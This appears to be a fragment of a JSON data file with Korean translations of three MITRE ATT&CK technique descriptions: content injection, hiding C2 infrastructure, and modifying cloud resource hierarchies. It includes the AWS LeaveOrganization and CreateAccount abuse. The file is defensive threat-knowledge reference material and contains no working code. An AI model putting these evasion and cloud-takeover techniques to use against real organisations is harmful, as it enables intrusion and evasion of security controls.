      "description": "위협 행위자는 온라인 네트워크 트래픽을 통해 시스템에 악성 콘텐츠를 삽입함으로써 피해자에게 접근하고 지속적으로 통신할 수 있습니다. 피해자를 손상된 웹사이트에 호스팅된 악성 페이로드로 유인하는 대신(즉, [드라이브-바이 타겟](https://attack.mitre.org/techniques/T1608/004) 후속 [드라이브-바이 컴프라미즈](https://attack.mitre.org/techniques/T1189)), 위협 행위자는 손상된 데이터 전송 채널을 통해 피해자에게 초기 접근을 시도할 수 있으며, 이 과정에서 트래픽을 조작하거나 그들만의 콘텐츠를 삽입할 수 있습니다. 이러한 손상된 온라인 네트워크 채널은 추가 페이로드(즉, [인그레스 툴 전송](https://attack.mitre.org/techniques/T1105)) 및 이미 손상된 시스템에 대한 기타 데이터를 전달하는 데에도 사용될 수 있습니다.(출처: ESET MoustachedBouncer)\n\n위협 행위자는 피해 시스템에 콘텐츠를 다양한 방법으로 삽입할 수 있습니다:\n\n* 중간에서, 위협 행위자가 합법적인 온라인 클라이언트-서버 통신의 중간에 위치하는 경우 (**참고:** 이 경우는 [중간자 공격](https://attack.mitre.org/techniques/T1557)과 유사하지만, 기업 환경 내에서 이루어지는 AiTM 활동과는 구별됩니다) (출처: Kaspersky Encyclopedia MiTM)\n* 측면에서, 합법적인 온라인 서버의 요청에 대한 가짜 응답으로 악성 콘텐츠가 삽입되어 클라이언트로 빠르게 전달되는 경우 (출처: Kaspersky ManOnTheSide)\n\n콘텐츠 삽입은 종종 손상된 상류 통신 채널의 결과로 발생합니다. 예를 들어, 인터넷 서비스 제공업체(ISP) 단계에서 \"합법적인 도청\"의 경우가 그렇습니다.(출처: Kaspersky ManOnTheSide)(출처: ESET MoustachedBouncer)(출처: EFF China GitHub Attack)",
      "external_id": "T1659",
      "modified": "2023-10-01T02:28:45.147Z",
      "title": "Content Injection",
      "translated": true
    },
    {
      "description": "적대자는 자신의 C2 인프라를 숨기고 탐지를 피하기 위해 네트워크 트래픽을 조작할 수 있습니다. 이는 방어 도구로부터의 트래픽을 식별하고 필터링하거나,(Citation: TA571) 악성 도메인을 마스킹하여 자동 스캔 도구와 보안 연구자 모두에게 진정한 목적지를 불명확하게 하거나,(Citation: Schema-abuse)(Citation: Facad1ng)(Citation: Browser-updates) 악성 아티팩트를 숨겨 발견을 지연시키고 전적으로 식별, 차단 또는 제거될 수 있는 적대자의 인프라의 효과를 연장하는 등의 다양한 방법으로 이루어질 수 있습니다.\n\nC2 네트워크는 IP 주소를 위장하기 위해 [프록시](https://attack.mitre.org/techniques/T1090) 또는 VPN을 사용하는 경우가 있으며, 이는 적대자가 정상 네트워크 트래픽에 섞여들어 조건부 접근 정책이나 남용 방지 보호를 우회할 수 있게 합니다. 예를 들어, 적대자는 가상 사설 클라우드를 사용하여 자신의 IP 주소를 피해자의 IP 주소 범위와 더 가까운 주소로 스푸핑할 수 있습니다. 이는 또한 소스 IP 주소의 지리적 위치에 기반한 보안 조치를 우회할 수 있습니다.(Citation: sysdig)(Citation: Orange Residential Proxies)\n\n적대자는 또한 다양한 방법으로 방어 도구를 피하기 위해 네트워크 트래픽을 필터링하려고 할 수 있으며, 일반적인 사고 대응자 또는 보안 장비의 사용자 에이전트를 차단하거나 리디렉션하는 것이 그 예입니다.(Citation: mod_rewrite)(Citation: SocGholish-update) IP 및 지리적 구역 기반으로 트래픽을 필터링하는 것도 자동 샌드박스나 연구자 활동을 피할 수 있습니다(즉, [가상화/샌드박스 회피](https://attack.mitre.org/techniques/T1497)).(Citation: TA571)(Citation: mod_rewrite)\n\nC2 인프라를 숨기는 것은 [리소스 개발](https://attack.mitre.org/tactics/TA0042) 활동인 [인프라 인수](https://attack.mitre.org/techniques/T1583) 및 [인프라 타협](https://attack.mitre.org/techniques/T1584)과도 관련이 있을 수 있습니다. 예를 들어, 저명한 URL 단축 제공자나 마케팅 서비스와 같은 널리 신뢰받는 호스팅 서비스나 도메인을 C2 네트워크에 사용하면, 적대자가 특정 조건이 충족된 이후 피해자를 악성 웹 페이지나 인프라로 리디렉션하는 양호한 콘텐츠를 제공할 수 있습니다.(Citation: StarBlizzard)(Citation: QR-cofense)",
      "external_id": "T1665",
      "modified": "2024-04-18T19:44:00.603Z",
      "title": "Hide Infrastructure",
      "translated": true
    },
    {
      "description": "위험 요소는 인프라를 서비스(IaaS) 환경에서 방어를 회피하기 위해 계층 구조를 수정하려고 시도할 수 있습니다.\n\nIaaS 환경은 자원을 계층적으로 그룹화하여 자원 관리 및 관련 그룹에 대한 정책 적용을 개선합니다. 계층 구조는 클라우드 공급자에 따라 다릅니다. 예를 들어, AWS 환경에서는 여러 계정이 단일 조직 아래에 그룹화될 수 있지만, Azure 환경에서는 여러 구독이 단일 관리 그룹 아래에 그룹화될 수 있습니다. (출처: AWS Organizations) (출처: Microsoft Azure Resources)\n\n위험 요소는 IaaS 계층 구조 내에서 리소스 그룹을 추가, 삭제 또는 수정할 수 있습니다. 예를 들어, Azure 환경에서 Global Administrator 계정에 접근한 위험 요소는 자원을 배포할 새 구독을 생성할 수 있습니다. 또한, 기존의 종량제 구독을 피해자 테넌트에서 위험 요소가 제어하는 테넌트로 이전하여 구독 탈취에 관여할 수 있습니다. 이는 위험 요소가 피해자의 컴퓨팅 자원을 로그를 생성하지 않고 사용할 수 있게 해줍니다. (출처: Microsoft Peach Sandstorm 2023) (출처: Microsoft Subscription Hijacking 2022)\n\nAWS 환경에서는 특정 계정에서 적절한 권한을 가진 위험 요소가 `LeaveOrganization` API를 호출하여 해당 계정이 이전에 연결된 AWS 조직과 분리되고, 이전 조직에 의해 부과된 서비스 제어 정책, 가드레일 및 제한이 제거됩니다. 또는 위험 요소는 `CreateAccount` API를 호출하여 AWS 조직 내에 새 계정을 생성할 수 있습니다. 이 계정은 결제 계정에 등록된 동일한 결제 방법을 사용하지만, 기존의 탐지 또는 서비스 제어 정책의 적용을 받지 않을 수 있습니다. (출처: AWS RE:Inforce Threat Detection 2024)",
      "external_id": "T1666",
      "modified": "2024-09-25T16:15:41.224Z",
      "title": "Modify Cloud Resource Hierarchy",
      "translated": true
    }
  ]
}